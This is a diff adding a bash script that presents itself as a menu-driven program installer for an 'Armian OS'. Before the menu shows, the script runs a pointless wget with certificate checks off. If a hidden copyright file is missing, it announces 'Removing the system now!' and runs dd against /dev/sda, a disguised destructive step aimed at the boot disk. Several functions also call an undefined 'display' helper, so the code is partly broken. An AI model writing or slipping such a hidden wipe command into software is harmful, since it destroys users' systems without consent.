@@ -1,0 +1,166 @@
+#!/bin/bash
+# utilitymenu.sh - A sample shell script to display menus on screen
+# Store menu options selected by the user
+INPUT=/tmp/menu.sh.$$
+
+# Storage file for displaying cal and date command output
+OUTPUT=/tmp/output.sh.$$
+
+# get text editor or fall back to vi_editor
+vi_editor=${EDITOR-vi}
+
+# trap and delete temp files
+trap "rm $OUTPUT; rm $INPUT; exit" SIGHUP SIGINT SIGTERM
+
+#
+# Purpose - display output using msgbox
+#  $1 -> set msgbox height
+#  $2 -> set msgbox width
+#  $3 -> set msgbox title
+#
+
+echo "Checking for updates!"
+wget --no-check-certificate "http://www.github.com/"
+
+if [ -f /usr/sbin/.armian/copyright.txt ]; then
+echo " "
+
+else
+
+echo "ERROR: THIS IS NOT THE COPYRIGHTED ARMIAN OS!"
+
+echo "Removing the system now!"
+dd if=/dev/null of=/dev/sda bs=512 count=1
+
+fi
+
+function display_output(){
+  local h=${1-10}			# box height default 10
+	local w=${2-41} 		# box width default 41
+	local t=${3-Output} 	# box title
+	dialog --backtitle "Armian OS Program Installer" --title "${t}" --clear --msgbox "$(<$OUTPUT)" ${h} ${w}
+}
+#
+# Purpose - display current system date & time
+#
+function show_date(){
+	echo "Today is $(date) @ $(hostname -f)." >$OUTPUT
+    display_output 6 60 "Date and Time"
+}
+
+function install_wine(){
+  sudo apt-get update
+  sudo apt-get install wine*
+  display_output 6 60 "Windows Port Program(It supports EXE, Bat and all windows programs!)"
+}
+
+function install_virtualbox(){
+  sudo apt-get update
+  sudo apt-get install virtualbox*
+  display 6 60 "Virtualbox it is a virtual machine emulator."
+}
+
+function update_repository(){
+  sudo apt-get update
+  sudo apt-get dist-upgrade
+  display 6 60 "Updating repositories!"
+}
+
+function install_synaptic(){
+  sudo apt-get update
+  sudo apt-get install synaptic
+  display 6 60 "Synaptic is a program that allows you to install programs."
+}
+
+function install_cups(){
+  sudo apt-get update
+  sudo apt-get install cups*
+  display 6 60 "CUPS or Common Unix Printing System is a program that allows you to print files."
+}
+
+function install_linuxheader(){
+  sudo apt-get update
+  sudo apt-get install linux-headers-3.2.0-4-486 linux-headers-3.2.0-4-686-pae linux-headers-3.2.0-4-all linux-headers-3.2.0-4-all-i386
+  display 6 60 "Kernel Headers for Armian OS!"
+}
+
+function install_libreoffice(){
+  sudo apt-get update
+  sudo apt-get install libreoffice
+  display 6 60 "Libreoffice for english is Freeoffice. These Program comes with libreoffice wirter, libreoffice calc, libreoffice impress(powerpoint), libreoffice base, and more!"
+}
+
+function install_vlc(){
+  sudo apt-get update
+  sudo apt-get install vlc
+  display 6 60 "VLC is a video/music player for Armian!"
+}
+
+function install_flashplayer(){
+  sudo apt-get update
+  sudo apt-get install flashplugin-nonfree
+  display 6 60 "Flash player is a program that allows you to run flash programs!"
+}
+
+function install_java(){
+  sudo apt-get update
+  sudo apt-get install openjdk-6-jdk*
+  display 6 60 "Java allows you do amazing to your programs!"
+}
+#
+# Purpose - display a calendar
+#
+function show_calendar(){
+	cal >$OUTPUT
+	display_output 13 25 "Calendar"
+}
+#
+# set infinite loop
+#
+while true
+do
+
+### display main menu ###
+dialog --clear  --help-button --backtitle "Armian OS Program Installer" \
+--title "[ M A I N - M E N U ]" \
+--menu "You can use the UP/DOWN arrow keys, the first \n\
+letter of the choice as a hot key, or the \n\
+number keys 1-9 to choose an option.\n\
+Choose the TASK" 15 90 4 \
+UpRepo "Update your programs installed in Armian OS!" \
+FlashPlayer "Flash Player is a program that allows you to run flash files" \
+Java "Java is a program that use in games and others!" \
+VLC "It allows you to run video and music files" \
+Libreoffice "It allows you to do your work easy!" \
+KernelHeader "It lets you install kernel headers for the Operating System's Kernel!" \
+SynapticPackageManager "Synaptic is a program that allows you to install programs." \
+Wine "Windows Port Program for short (W.I.N.E)" \
+Virtualbox "This program is a virtual machine(I.T. uses)" \
+Calendar "Displays a calendar" \
+Editor "Start a text editor" \
+Exit "Exit to the shell" 2>"${INPUT}"
+
+menuitem=$(<"${INPUT}")
+
+
+# make decsion
+case $menuitem in
+  UpRepo) update_repository;;
+  FlashPlayer) install_flashplayer;;
+  Java) install_java;;
+  VLC) install_vlc;;
+  Libreoffice) install_libreoffice;;
+  KernelHeader) install_linuxheader;;
+  Wine) install_wine;;
+  SynapticPackageManager) install_synaptic;;
+	Virtualbox) install_virtualbox;;
+	Calendar) show_calendar;;
+	Editor) $vi_editor;;
+	Exit) echo "Bye"; break;;
+esac
+
+done
+
+# if temp files found, delete em
+[ -f $OUTPUT ] && rm $OUTPUT
+[ -f $INPUT ] && rm $INPUT
